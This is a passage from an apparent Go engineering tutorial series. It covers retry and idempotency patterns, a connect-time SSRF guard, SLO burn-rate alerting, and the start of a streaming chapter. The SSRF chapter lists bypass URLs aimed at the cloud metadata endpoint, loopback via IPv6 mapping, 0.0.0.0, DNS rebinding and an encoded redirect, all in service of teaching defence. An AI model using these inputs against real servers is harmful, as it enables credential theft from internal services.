retried "create order" creates two orders. Most cascading failures are
retry policies working exactly as written.

### How it actually works

| Mechanism | Side | What it prevents |
|---|---|---|
| **Rate limiting** (token bucket) + `429 Too Many Requests` + `Retry-After` | Server | One client consuming capacity meant for all |
| **Idempotency keys** | Server | Duplicate side effects when a request is retried |
| **Exponential backoff with jitter** | Client | Synchronised retry waves |
| **Retry budget** | Client | Retries multiplying load during an outage |
| **Circuit breaker** | Client | Waiting on, and adding load to, a dependency that is down |
| **Deadlines** propagated with `context` | Both | Work continuing after the caller has given up |

**Token bucket:** a bucket holds up to *burst* tokens and refills at *rate*
tokens per second. Each request takes one, and an empty bucket means 429. It
allows short bursts while enforcing an average.

**Idempotency key:** the client generates a unique key per *operation* and
sends the same key on every retry. The server records the key **in the same
transaction as the side effect**. A retry finds the existing result instead of
creating a new one.

**Full jitter:** sleep a *random* time between 0 and `base × 2^attempt`. Without
randomness, a thousand clients that failed together retry together, and
fail together again.

**Circuit breaker:** CLOSED (normal) → after N failures, OPEN (fail
immediately, no calls) → after a cool-down, HALF-OPEN (let a trial request
through) → CLOSED if it succeeds.

### Build it in Go (60 min) — all four, measured

`resilience` runs a flaky "create order" server and a well-behaved client
against it. 30% of first attempts fail **after** the order has been committed,
the hardest case for retries, because the client can't tell the order exists:

```go
// resilience: the four mechanisms that keep retries from becoming outages.
//
//	server: per-client token-bucket rate limiting (429 + Retry-After)
//	        Idempotency-Key handling (a retried POST never creates two orders)
//	client: retries with exponential backoff + full jitter, a retry budget,
//	        and a circuit breaker
//
//	go run ./resilience
package main

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"math"
	mrand "math/rand/v2"
	"net/http"
	"net/http/httptest"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

// ------------------------------------------------------------ server side --

// bucket is a token bucket: capacity `burst`, refilled at `rate` per second.
type bucket struct {
	tokens float64
	last   time.Time
}

type limiter struct {
	mu      sync.Mutex
	rate    float64
	burst   float64
	buckets map[string]*bucket
}

// allow reports whether the client may proceed, and if not, how long to wait.
func (l *limiter) allow(key string) (bool, time.Duration) {
	l.mu.Lock()
	defer l.mu.Unlock()
	now := time.Now()
	b := l.buckets[key]
	if b == nil {
		b = &bucket{tokens: l.burst, last: now}
		l.buckets[key] = b
	}
	b.tokens = math.Min(l.burst, b.tokens+now.Sub(b.last).Seconds()*l.rate)
	b.last = now
	if b.tokens >= 1 {
		b.tokens--
		return true, 0
	}
	return false, time.Duration((1 - b.tokens) / l.rate * float64(time.Second))
}

func rateLimit(l *limiter, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		key := r.Header.Get("X-API-Key") // identity, not IP: NAT puts many users behind one IP
		if ok, wait := l.allow(key); !ok {
			w.Header().Set("Retry-After", strconv.Itoa(int(math.Ceil(wait.Seconds()))))
			http.Error(w, "slow down", http.StatusTooManyRequests)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// orders is the "database". The idempotency key is recorded IN THE SAME
// TRANSACTION as the side effect, so a retry -- even one whose first attempt
// committed and then lost its response -- finds the existing order instead
// of creating a second one. (Caching HTTP responses is NOT enough: a request
// that committed and then failed has no successful response to cache.)
type orders struct {
	mu    sync.Mutex
	byKey map[string]int
	next  int
}

// create returns the order for this key, creating it only the first time.
func (o *orders) create(key string) (id int, replay bool) {
	o.mu.Lock() // production: INSERT ... ON CONFLICT (idempotency_key) DO NOTHING
	defer o.mu.Unlock()
	if id, ok := o.byKey[key]; ok {
		return id, true
	}
	o.next++
	o.byKey[key] = o.next
	return o.next, false
}

// ------------------------------------------------------------ client side --

type breaker struct {
	mu       sync.Mutex
	failures int
	openTill time.Time
}

var errOpen = errors.New("circuit open: failing fast without calling the server")

func (b *breaker) before() error {
	b.mu.Lock()
	defer b.mu.Unlock()
	if time.Now().Before(b.openTill) {
		return errOpen // OPEN: don't even try
	}
	return nil // CLOSED, or HALF-OPEN after the cool-down (one trial gets through)
}

func (b *breaker) after(ok bool) {
	b.mu.Lock()
	defer b.mu.Unlock()
	if ok {
		b.failures = 0
		return
	}
	b.failures++
	if b.failures >= 5 {
		b.openTill = time.Now().Add(2 * time.Second)
		b.failures = 0
	}
}

type client struct {
	http     *http.Client
	brk      breaker
	requests atomic.Int64
	retries  atomic.Int64
}

// budgetOK caps retries at 20% of first attempts: under a real outage,
// retries can't multiply the load by more than 1.2x.
func (c *client) budgetOK() bool {
	return float64(c.retries.Load()) < 0.2*float64(c.requests.Load())+5
}

func (c *client) post(url, key string) (string, error) {
	c.requests.Add(1)
	for attempt := 0; ; attempt++ {
		if err := c.brk.before(); err != nil {
			return "", err
		}
		req, _ := http.NewRequest("POST", url, nil)
		req.Header.Set("Idempotency-Key", key) // SAME key on every retry: that's the point
		req.Header.Set("X-API-Key", "team-a")
		resp, err := c.http.Do(req)
		var body []byte
		status := 0
		if err == nil {
			body, _ = io.ReadAll(resp.Body)
			resp.Body.Close()
			status = resp.StatusCode
		}
		c.brk.after(err == nil && status < 500)
		if err == nil && status < 300 {
			return string(body), nil
		}
		retryable := err != nil || status == 429 || status >= 500
		if !retryable || attempt == 3 || !c.budgetOK() {
			return "", fmt.Errorf("giving up after %d attempts (last status %d, err %v)", attempt+1, status, err)
		}
		c.retries.Add(1)
		// Exponential backoff with FULL jitter: random in [0, base*2^attempt].
		// Jitter spreads retries out so clients don't retry in lockstep.
		backoff := time.Duration(mrand.Int64N(int64(50*time.Millisecond) << attempt))
		if status == 429 && resp.Header.Get("Retry-After") != "" {
			s, _ := strconv.Atoi(resp.Header.Get("Retry-After"))
			backoff = max(backoff, time.Duration(s)*time.Second)
		}
		time.Sleep(backoff)
	}
}

func newKey() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ------------------------------------------------------------------- demo --

func main() {
	db := &orders{byKey: map[string]int{}}
	var down atomic.Bool
	flaky := func(w http.ResponseWriter, r *http.Request) {
		if down.Load() {
			http.Error(w, "down", http.StatusServiceUnavailable)
			return
		}
		key := r.Header.Get("Idempotency-Key")
		if key == "" {
			http.Error(w, "Idempotency-Key required", http.StatusBadRequest)
			return
		}
		id, replay := db.create(key) // the side effect, deduplicated by key
		if !replay && mrand.Float64() < 0.3 {
			// The order WAS created, but the response is lost -- the worst case for retries.
			http.Error(w, "oops after commit", http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, "order %d", id)
	}
	lim := &limiter{rate: 50, burst: 20, buckets: map[string]*bucket{}}
	mux := http.NewServeMux()
	mux.HandleFunc("POST /orders", flaky)
	srv := httptest.NewServer(rateLimit(lim, mux))
	defer srv.Close()

	c := &client{http: &http.Client{Timeout: 2 * time.Second}}
	ok, failed := 0, 0
	for i := 0; i < 40; i++ {
		if _, err := c.post(srv.URL+"/orders", newKey()); err != nil {
			failed++
		} else {
			ok++
		}
	}
	db.mu.Lock()
	n := db.next
	db.mu.Unlock()
	fmt.Printf("phase 1, flaky server (30%% of first attempts fail AFTER committing):\n")
	fmt.Printf("  40 distinct orders sent, %d confirmed, %d gave up, %d retries\n", ok, failed, c.retries.Load())
	fmt.Printf("  orders in the database: %d  <- never more than 40: no duplicates\n", n)

	// Same idempotency key twice: the server replays the first answer.
	key := newKey()
	for {
		if a, err := c.post(srv.URL+"/orders", key); err == nil {
			b, _ := c.post(srv.URL+"/orders", key)
			fmt.Printf("\nsame key sent twice: %q then %q -> one order, two identical answers\n", a, b)
			break
		}
	}

	down.Store(true)
	start := time.Now()
	fast := 0
	for i := 0; i < 20; i++ {
		if _, err := c.post(srv.URL+"/orders", newKey()); errors.Is(err, errOpen) {
			fast++
		}
	}
	fmt.Printf("\nphase 2, server down: %d of 20 calls failed fast with the breaker open (%v total)\n",
		fast, time.Since(start).Round(time.Millisecond))
}
```

```text
$ go run ./resilience
phase 1, flaky server (30% of first attempts fail AFTER committing):
  40 distinct orders sent, 38 confirmed, 2 gave up, 12 retries
  orders in the database: 40  <- never more than 40: no duplicates

same key sent twice: "order 41" then "order 41" -> one order, two identical answers

phase 2, server down: 17 of 20 calls failed fast with the breaker open (1.141s total)
```

**What to notice:**

- **No duplicates.** 12 retries, and the database still has exactly one order
  per key. The "2 gave up" orders exist in the database even though the client
  saw an error. That's why the *client* must also be able to look an
  operation up by its key later.
- **An earlier version of this lab was wrong in an instructive way.** It
  implemented idempotency as middleware that cached *successful responses*.
  Because 30% of first attempts committed the order and *then* failed, there
  was no successful response to cache, and the retry created a second order:
  40 distinct keys produced **52** orders. The key must be recorded with the side
  effect itself (in SQL, a unique constraint on `idempotency_key` with
  `INSERT ... ON CONFLICT DO NOTHING`), not in a response cache.
- **The breaker turned 20 doomed calls into 3 real attempts and 17 instant
  failures.** The server got a rest, and callers got an immediate answer
  instead of waiting for timeouts.
- **Rate limits are keyed by API key, not IP** (NAT puts many users behind one
  address; see the [OSI guide, Layer 3](../networking/real-life-example-osi.md#part-5-layer-3-network)). The response carries
  `Retry-After`, and the client honours it.

**Exercises:**

1. Lower the limiter to `rate: 5, burst: 5`, rerun, and count the 429s. Does the
   client's backoff respect `Retry-After`?
2. Remove the jitter (sleep exactly `50ms << attempt`), run 50 clients
   concurrently against a server that fails for 2 seconds, and plot when
   requests arrive. You'll see the synchronised waves.
3. Add **deadline propagation**: give each call a `context.WithTimeout` and have
   the server stop work when `r.Context()` is cancelled.
4. Replace the in-memory `orders` map with SQLite or Postgres and a unique
   index on the key, then run two clients that use the same key concurrently.

### Real-world scenario
A payment provider has a 2-minute brownout. The checkout service retries 3
times, the API gateway in front of it retries 3 times, and the mobile app
retries 3 times: up to 27 attempts per user action, all landing on the
provider as it recovers, which knocks it over again. Two orders get charged
twice because the retry carried no idempotency key. The fix: retry at one
layer only, with a budget and jitter; idempotency keys on every payment call;
and a breaker that sheds load while the provider recovers.

### Common mistakes
- Retrying at every layer.
- Retrying non-idempotent operations without an idempotency key.
- Implementing idempotency as a response cache instead of in the transaction.
- Fixed backoff with no jitter.
- Rate limiting only by IP.
- Circuit breakers with no half-open state, which never recover on their own.

### Check yourself
1. Why must the idempotency key be stored with the side effect?
2. What problem does jitter solve that exponential backoff alone doesn't?
3. What is a retry budget, and what does it guarantee during an outage?
4. Describe the three circuit-breaker states and the transitions between them.

### Key Takeaways
- Retry only idempotent operations (or ones with idempotency keys), at one layer, with jittered backoff and a budget.
- Servers should say "slow down" explicitly (429 + `Retry-After`), keyed by identity.
- Breakers protect both the caller's latency and the dependency's recovery.

**Across the series:** [Chapter 9](#chapter-9-load-balancers-rate-limiting) (rate limiting
concepts); [TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries) (retry
traps at the load balancer); Go plan [Day 76](../Golang/detailed-90-day-plan/week11.md#day-76-rate-limiting-at-l7) (token-bucket
middleware), [Day 92](../Golang/detailed-90-day-plan/week13.md#day-92-rate-limiting-algorithms-deep-dive) (five rate-limiting algorithms), and
[Day 110](../Golang/detailed-90-day-plan/week15.md#day-110-chaos-engineering) (chaos middleware and circuit breaker); the
[OSI guide's idempotency discussion](../networking/real-life-example-osi.md#part-9-layer-7-application).

## Chapter 22 — Outbound requests: SSRF and safe HTTP clients

### In one sentence
Whenever your server fetches a URL that a user influenced, it must check the
**IP address it actually connects to**, after DNS resolution and on every
redirect, or the user can make your server reach things only it can reach.

### Why this matters
Webhooks, link previews, "import from URL", PDF renderers, and image proxies
all fetch user-supplied URLs. Your server sits inside your network, next to
databases, admin panels, and the cloud **metadata service** at
`169.254.169.254`, which hands out the instance's cloud credentials. Server-side
request forgery (SSRF) was behind major breaches, including the 2019 Capital
One breach, where an SSRF reached the AWS metadata service. It's in the OWASP
Top 10.

### How it actually works
String checks on the URL fail, because there are too many ways to name the
same address:

```
http://169.254.169.254/              the obvious one
http://[::ffff:7f00:1]/              127.0.0.1 as an IPv4-mapped IPv6 address
http://0.0.0.0:6379/                 "any address" reaches local services on many OSes
http://localtest.me/                 a PUBLIC DNS name that resolves to 127.0.0.1
http://attacker.example/             resolves to a public IP at check time, 127.0.0.1 at fetch time (DNS rebinding)
https://public.example/redirect      a 302 to http://169.254.169.254/
```

The reliable check happens **at connect time**. Go's `net.Dialer.Control`
hook runs after DNS resolution and immediately before `connect()`, receiving the
literal IP:port. Every connection the client makes goes through it, including
each redirect.

Cloud defences add a second layer: **IMDSv2** on AWS requires a session token
obtained with a PUT request that has a hop limit of 1, which defeats most SSRF.
Enable it.

### Build it in Go (30 min) — an SSRF-safe client

```go
// ssrfguard: an HTTP client that is safe to point at user-supplied URLs.
//
// Server-side request forgery (SSRF): your server fetches a URL a user gave
// you (webhooks, link previews, image import) and the user gives you
// http://169.254.169.254/ (cloud metadata credentials) or http://localhost:6379/.
// Checking the URL STRING is not enough -- DNS names, redirects, and odd IP
// spellings get around it. Check the IP address at the moment of connecting.
//
//	go run ./ssrfguard
package main

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"strings"
	"syscall"
	"time"
)

var errBlocked = errors.New("blocked: destination is not a public address")

// publicOnly runs AFTER DNS resolution and BEFORE connect(), for every
// connection the client makes -- including each redirect hop. `address` is
// the literal IP:port being dialled, so there is nothing left to trick.
func publicOnly(network, address string, _ syscall.RawConn) error {
	ap, err := netip.ParseAddrPort(address)
	if err != nil {
		return errBlocked
	}
	ip := ap.Addr().Unmap() // ::ffff:127.0.0.1 is 127.0.0.1
	switch {
	case ip.IsLoopback(), ip.IsPrivate(), ip.IsLinkLocalUnicast(), // 127/8, 10/8, 172.16/12, 192.168/16, fc00::/7, 169.254/16
		ip.IsLinkLocalMulticast(), ip.IsInterfaceLocalMulticast(), ip.IsMulticast(),
		ip.IsUnspecified(), // 0.0.0.0 reaches localhost on many systems
		cgnat.Contains(ip):
		return fmt.Errorf("%w (%s)", errBlocked, ip)
	}
	if ap.Port() != 80 && ap.Port() != 443 {
		return fmt.Errorf("%w (port %d)", errBlocked, ap.Port())
	}
	return nil
}

var cgnat = netip.MustParsePrefix("100.64.0.0/10")

func safeClient() *http.Client {
	dialer := &net.Dialer{Timeout: 3 * time.Second, Control: publicOnly}
	return &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DialContext: dialer.DialContext,
			Proxy:       nil, // an environment proxy would dial on our behalf, bypassing the check
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return errors.New("too many redirects")
			}
			return nil // each hop is dialled through publicOnly again
		},
	}
}

// naiveCheck is what people write first. Every line of the demo defeats it.
func naiveCheck(raw string) bool {
	for _, bad := range []string{"localhost", "127.0.0.1", "169.254.169.254", "10.", "192.168."} {
		if strings.Contains(raw, bad) {
			return false
		}
	}
	return true
}

func main() {
	internal := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "SECRET internal admin data")
	}))
	defer internal.Close()
	_, port, _ := net.SplitHostPort(strings.TrimPrefix(internal.URL, "http://"))

	tests := []string{
		"https://example.com/",                     // fine
		"http://169.254.169.254/latest/meta-data/", // cloud metadata endpoint
		"http://[::ffff:7f00:1]:" + port + "/",     // 127.0.0.1, spelled as IPv4-mapped IPv6
		"http://0.0.0.0:" + port + "/",             // "any" address reaches local services
		"http://localtest.me:" + port + "/",        // a public DNS name that resolves to 127.0.0.1
		// A public URL that REDIRECTS to the metadata service (URL-encoded, so
		// the string check can't see it). The first hop is allowed; the second is not.
		"https://httpbin.org/redirect-to?url=http%3A%2F%2F%31%36%39.254.169.254%2F",
	}
	c := safeClient()
	for _, u := range tests {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
		resp, err := c.Do(req)
		cancel()
		verdict := "ALLOWED"
		if err != nil {
			verdict = "BLOCKED"
			if !errors.Is(err, errBlocked) {
				verdict = "ERROR  "
			}
		} else {
			resp.Body.Close()
		}
		short := u
		if len(short) > 46 {
			short = short[:46] + "..."
		}
		fmt.Printf("%-50s naive=%-5v  guarded=%s", short, naiveCheck(u), verdict)
		if err != nil {
			msg := err.Error()
			if i := strings.Index(msg, "blocked:"); i >= 0 {
				msg = msg[i:]
			}
			fmt.Printf("  (%s)", msg)
		}
		fmt.Println()
	}
}
```

```text
$ go run ./ssrfguard
https://example.com/                               naive=true   guarded=ALLOWED
http://169.254.169.254/latest/meta-data/           naive=false  guarded=BLOCKED  (blocked: destination is not a public address (169.254.169.254))
http://[::ffff:7f00:1]:57786/                      naive=true   guarded=BLOCKED  (blocked: destination is not a public address (127.0.0.1))
http://0.0.0.0:57786/                              naive=true   guarded=BLOCKED  (blocked: destination is not a public address (0.0.0.0))
http://localtest.me:57786/                         naive=true   guarded=BLOCKED  (blocked: destination is not a public address (::1))
https://httpbin.org/redirect-to?url=http%3A%2F...  naive=true   guarded=BLOCKED  (blocked: destination is not a public address (169.254.169.254))
```

**What to notice:**

- **The naive string check let four of the five attacks through**
  (`naive=true`). The connect-time check blocked all of them.
- **The redirect case**: the first hop (httpbin.org, a public address) was
  allowed. The redirect target was blocked when the client dialled it. Checking
  only the *initial* URL would have missed it.
- **`localtest.me` resolved to `::1`**: the check works on whatever address DNS
  returns, including IPv6, so DNS rebinding gains nothing.
- **`Proxy: nil`**: if the transport used an HTTP proxy from the environment,
  the *proxy* would dial the target, and our check would only see the proxy's
  address.
- **Ports are restricted to 80/443**, so a user can't make you talk to
  Redis on 6379 even on a public IP.

**Exercises:**

1. Add a response size limit (`io.LimitReader`) and a content-type allow-list.
   SSRF defences also need to stop your server downloading 10 GB or HTML when
   it expected an image.
2. Add an allow-list mode for webhooks: only domains a customer has verified.
3. Log every blocked attempt with the user ID. An SSRF probe is a security
   event worth alerting on.

### Real-world scenario
A "fetch a thumbnail for this link" feature validates that the URL's host isn't
`localhost` or a private IP. An attacker registers a domain whose DNS answer
changes: public IP during validation, `169.254.169.254` during the fetch. The
server downloads the instance's IAM credentials and returns them as the
"thumbnail". Checking at connect time, plus IMDSv2, closes both doors.

### Common mistakes
- Validating the URL string, or resolving once to check and again to fetch.
- Following redirects without re-checking each hop.
- Forgetting IPv6, IPv4-mapped IPv6, `0.0.0.0`, and CGNAT space.
- Letting the client use an environment HTTP proxy.
- No size, time, or content-type limits on what you fetch.

### Check yourself
1. Why must the check happen in `Dialer.Control` rather than before the request?
2. How does a redirect bypass a check on the initial URL?
3. What does IMDSv2's hop limit of 1 defend against?

### Key Takeaways
- Check the IP you are about to connect to, every time, including redirects.
- Block loopback, private, link-local, unspecified, CGNAT, and multicast, and restrict ports.
- Layer cloud defences (IMDSv2, egress firewall rules) on top of the application check.

**Across the series:** [Chapter 12](#chapter-12-security-protecting-the-entire-lifecycle) (web attack
classes); [TCP/IP guide, Chapter 53](../networking/tcp-ip/real-life-guide-v1.md#chapter-53-firewalls-in-the-real-world-host-firewalls-cloud-security-groups-nacls) (egress
firewalling as a second layer); [Go guide, Chapter 47](../Golang/real-life-golang-guide.md#47-secure-coding-practices-in-go)
(secure coding in Go).

## Chapter 23 — SLIs, SLOs, and error budgets for HTTPS services

### In one sentence
A Service Level Indicator measures what users experience, a Service Level
Objective sets the target, and the **error budget** (the failures the target
allows) turns reliability into a number that both engineers and managers can
make decisions with.

### Why this matters
"Is the site healthy?" has no useful answer without a definition. Alerting
on CPU or on single errors either pages people constantly or misses real
outages. SLOs tie alerts to user impact: page when the budget is burning fast
enough to matter, open a ticket when it's burning slowly, and stay quiet
otherwise. They also settle the "features vs reliability" argument with data:
budget left means ship, budget gone means fix.

(Chapter 13 uses SLI/SLO for *Site Local In/Out* traffic direction. This
chapter uses the SRE meaning.)

### How it actually works

**SLI** = good events ÷ valid events, measured where users feel it (at the
load balancer or edge, not inside the app):

```
availability SLI = requests that were not 5xx          / all requests
latency SLI      = requests answered in under 300 ms   / all requests
```

**SLO** = a target over a window: "99.9% of requests are good over a rolling
30 days".

**Error budget** = 1 − SLO = 0.1% of requests may be bad. At 600 requests per
minute that's about 25,900 bad requests a month, or the equivalent of
**43 minutes** of total outage.

**Burn rate** = how fast you're spending the budget. A burn rate of 1 uses
exactly the whole budget in 30 days. A burn rate of 14.4 uses 2% of it per hour,
so the whole budget lasts about 2 days.

**Multi-window, multi-burn-rate alerts** (from Google's *SRE Workbook*):

| Severity | Condition | Meaning |
|---|---|---|
| Page | burn > 14.4 over 1 h **and** over 5 min | 2% of the monthly budget in an hour, still happening |
| Page | burn > 6 over 6 h **and** over 30 min | 5% of the budget in 6 hours |
| Ticket | burn > 1 over 3 days **and** over 6 h | on pace to miss the SLO this month |

The long window proves the problem is significant. The short window proves it's
*still happening*, so the alert stops soon after recovery.

### Build it in Go (45 min) — burn-rate alerting, simulated

`slo` counts good and total events in one-minute buckets, computes SLIs over
any window, and evaluates the alert table above. Its `Middleware` shows how
real HTTP traffic feeds it. The demo replays 30 days of synthetic traffic with
a simulated clock: a 30-minute outage on day 20, and a slow leak from day 25.

```go
// slo: SLIs, an SLO, an error budget, and multi-window burn-rate alerts --
// the way Google's SRE Workbook recommends alerting on them.
//
// The tracker counts good/total events in one-minute buckets. A real service
// feeds it from HTTP middleware (see Middleware); the demo replays 30 days of
// synthetic traffic with a simulated clock so you can watch alerts fire.
//
//	go run ./slo
package main

import (
	"fmt"
	"net/http"
	"time"
)

const (
	objective = 0.999 // 99.9% of requests good over 30 days
	window    = 30 * 24 * time.Hour
)

type bucket struct{ good, total int64 }

type tracker struct {
	buckets map[int64]*bucket // unix minute -> counts
	now     func() time.Time
}

func newTracker(now func() time.Time) *tracker {
	return &tracker{buckets: map[int64]*bucket{}, now: now}
}

// Record is one event: good means "fast enough AND not a server error".
func (t *tracker) Record(good bool) {
	m := t.now().Unix() / 60
	b := t.buckets[m]
	if b == nil {
		b = &bucket{}
		t.buckets[m] = b
	}
	b.total++
	if good {
		b.good++
	}
}

// sli = good / total over the trailing duration d.
func (t *tracker) sli(d time.Duration) (sli float64, total int64) {
	end := t.now().Unix() / 60
	var good int64
	for m := end - int64(d/time.Minute) + 1; m <= end; m++ {
		if b := t.buckets[m]; b != nil {
			good += b.good
			total += b.total
		}
	}
	if total == 0 {
		return 1, 0
	}
	return float64(good) / float64(total), total
}

// burnRate: how fast we are spending the error budget. 1.0 = exactly on pace
// to use 100% of the budget in 30 days; 14.4 = the whole budget in ~2 days.
func (t *tracker) burnRate(d time.Duration) float64 {
	s, _ := t.sli(d)
	return (1 - s) / (1 - objective)
}

func (t *tracker) budgetRemaining() float64 {
	s, total := t.sli(window)
	allowed := (1 - objective) * float64(total)
	bad := (1 - s) * float64(total)
	if allowed == 0 {
		return 1
	}
	return 1 - bad/allowed
}

// alert implements the multi-window, multi-burn-rate policy: a long window
// proves the problem is significant, a short window proves it is STILL
// happening (so alerts stop soon after recovery).
func (t *tracker) alert() string {
	switch {
	case t.burnRate(time.Hour) > 14.4 && t.burnRate(5*time.Minute) > 14.4:
		return "PAGE   (2% of the monthly budget burned in 1h)"
	case t.burnRate(6*time.Hour) > 6 && t.burnRate(30*time.Minute) > 6:
		return "PAGE   (5% of the budget burned in 6h)"
	case t.burnRate(3*24*time.Hour) > 1 && t.burnRate(6*time.Hour) > 1:
		return "TICKET (on pace to miss the SLO this month)"
	}
	return "ok"
}

// Middleware turns real traffic into SLI events: 5xx = bad, slower than
// `slow` = bad (a latency SLI), everything else = good. 4xx are the
// client's fault and count as good.
func (t *tracker) Middleware(slow time.Duration, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		rec := &status{ResponseWriter: w, code: 200}
		next.ServeHTTP(rec, r)
		t.Record(rec.code < 500 && time.Since(start) < slow)
	})
}

type status struct {
	http.ResponseWriter
	code int
}

func (s *status) WriteHeader(c int) { s.code = c; s.ResponseWriter.WriteHeader(c) }

// ------------------------------------------------------------------ demo --

func main() {
	clock := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)
	t := newTracker(func() time.Time { return clock })

	// 600 requests/minute. Baseline: 0.02% bad. Two incidents:
	//   day 20, 14:00-14:30  hard outage, 20% of requests fail
	//   day 25 onwards       slow leak, 0.25% bad (2.5x the allowed rate)
	errRate := func(c time.Time) float64 {
		day := c.Sub(time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)).Hours() / 24
		switch {
		case day >= 19 && day < 20 && c.Hour() == 14 && c.Minute() < 30:
			return 0.20
		case day >= 24:
			return 0.0025
		}
		return 0.0002
	}
	report := func(label string) {
		s, _ := t.sli(window)
		fmt.Printf("%-34s 30d SLI=%.4f%%  budget left=%6.1f%%  burn 1h=%5.1f 6h=%5.1f  -> %s\n",
			label, s*100, t.budgetRemaining()*100, t.burnRate(time.Hour), t.burnRate(6*time.Hour), t.alert())
	}
	var acc float64
	step := func(minutes int) {
		for i := 0; i < minutes; i++ {
			clock = clock.Add(time.Minute)
			for r := 0; r < 600; r++ {
				acc += errRate(clock) // deterministic: exactly errRate of requests fail
				bad := acc >= 1
				if bad {
					acc--
				}
				t.Record(!bad)
			}
		}
	}

	step(19*24*60 + 14*60 + 5) // up to day 20, 14:05
	report("day 20 14:05 (outage, 5 min in)")
	step(10)
	report("day 20 14:15 (outage ongoing)")
	step(45)
	report("day 20 15:00 (30 min after fix)")
	step(4*24*60 + 9*60)
	report("day 25 00:00 (slow leak begins)")
	step(3 * 24 * 60)
	report("day 28 00:00 (leak for 3 days)")
	step(2*24*60 + 23*60)
	report("day 30 23:00 (month end)")
}
```

```text
$ go run ./slo
day 20 14:05 (outage, 5 min in)    30d SLI=99.9758%  budget left=  75.8%  burn 1h= 20.2 6h=  3.5  -> PAGE   (2% of the monthly budget burned in 1h)
day 20 14:15 (outage ongoing)      30d SLI=99.9687%  budget left=  68.7%  burn 1h= 53.5 6h=  9.1  -> PAGE   (2% of the monthly budget burned in 1h)
day 20 15:00 (30 min after fix)    30d SLI=99.9588%  budget left=  58.8%  burn 1h= 96.8 6h= 16.9  -> TICKET (on pace to miss the SLO this month)
day 25 00:00 (slow leak begins)    30d SLI=99.9627%  budget left=  62.7%  burn 1h=  0.2 6h=  0.2  -> ok
day 28 00:00 (leak for 3 days)     30d SLI=99.9390%  budget left=  39.0%  burn 1h=  2.5 6h=  2.5  -> TICKET (on pace to miss the SLO this month)
day 30 23:00 (month end)           30d SLI=99.9204%  budget left=  20.4%  burn 1h=  2.5 6h=  2.5  -> TICKET (on pace to miss the SLO this month)
```

**Read it as an on-call engineer would:**

- **The outage paged within 5 minutes** (1 h burn 20.2 > 14.4, and the 5-minute
  window agreed).
- **30 minutes after the fix it no longer pages**, even though the 1-hour burn
  rate is at its *highest* (96.8), because the 5-minute window is clean. That's
  the short window doing its job: no pages for problems that are already over.
- **The slow leak never paged** (burn 2.5), but it opened a ticket after 3 days.
  A 0.25% error rate doesn't need anyone out of bed. It does need fixing this
  week, because it consumed 40% of the month's budget.
- **The month ended inside the SLO** (99.92% > 99.9%), with 20% of the budget
  left. That number is what a team uses to decide whether this sprint ships
  features or reliability work.

**Exercises:**

1. Change the objective to 99.99%. How long can the outage last before the
   monthly SLO is lost? (About 4.3 minutes of total outage per 30 days.)
2. Add a latency SLI: record `good` only if the request also finished under a
   threshold, and simulate a latency regression that causes no errors at all.
3. Wire `Middleware` into Chapter 19's server and expose the burn rates on
   `/metrics` in Prometheus format (the TCP/IP guide's
   [`prober` lab](../networking/tcp-ip/real-life-guide-v1.md#chapter-46-where-the-numbers-come-from-counters-flows-and-probes) shows the text format).

### Real-world scenario
A team pages on "any 5xx in the last 5 minutes". On-call gets 30 pages a
week, almost all for single errors, so pages start being ignored. When a real
outage starts, it takes 40 minutes to get attention. After switching to
burn-rate alerts on a 99.9% SLO, pages drop to one or two a month, each of
them real. The error-budget report becomes part of sprint planning, and the
reliability arguments stop being matters of opinion.

### Common mistakes
- Measuring SLIs inside the application, which misses failures in the load
  balancer, TLS, or DNS. Measure at the edge, or with probes.
- Choosing 100% (or "five nines" for everything) as the objective. It leaves
  no budget to change anything.
- Alerting on single errors or on causes (CPU, memory) instead of symptoms.
- Counting 4xx client errors as failures.
- Single-window burn alerts that keep paging long after recovery.

### Check yourself
1. Define SLI, SLO, and error budget for an API in one sentence each.
2. What does a burn rate of 14.4 mean for a 30-day budget?
3. Why does the multi-window alert stop paging 30 minutes after the fix?
4. How should a team use the remaining budget at sprint planning?

### Key Takeaways
- Measure what users experience, set a realistic objective, and spend the error budget deliberately.
- Page on fast burn confirmed by a short window. Ticket on slow burn.
- The error budget turns reliability into a planning input, not an argument.

**Across the series:** [TCP/IP guide, Chapters 45–47](../networking/tcp-ip/real-life-guide-v1.md#chapter-45-what-to-measure-and-why-averages-lie)
(why averages lie, where metrics come from, alert design); [Go guide,
Chapter 65](../Golang/real-life-golang-guide.md#65-observability-in-go-services-logs-metrics-traces-health-profiling) (observability in Go services); Go plan
[Day 109](../Golang/detailed-90-day-plan/week15.md#day-109-observability-traces-spans) (traces and spans).

## Chapter 24 — Streaming over HTTP: Server-Sent Events, WebSockets, and long-lived connections

### In one sentence
Streaming responses keep one HTTP request open for minutes or hours, which
breaks assumptions made by every timeout, buffer, and load balancer designed for
short requests, unless you configure each hop for it.

### Why this matters
Live dashboards, notifications, chat, AI token streaming, and progress
updates all hold connections open. They work on a laptop and fail in
production because a proxy buffers the response, an idle timeout cuts the
connection, the server's own `WriteTimeout` kills it, or a deploy disconnects
every client at once.

### How it actually works

| Technology | Direction | Over | Notes |
|---|---|---|---|
| **Server-Sent Events (SSE)** | server → client | plain HTTP response, `text/event-stream` | Built-in browser reconnect with `Last-Event-ID`; works through most proxies; simplest |
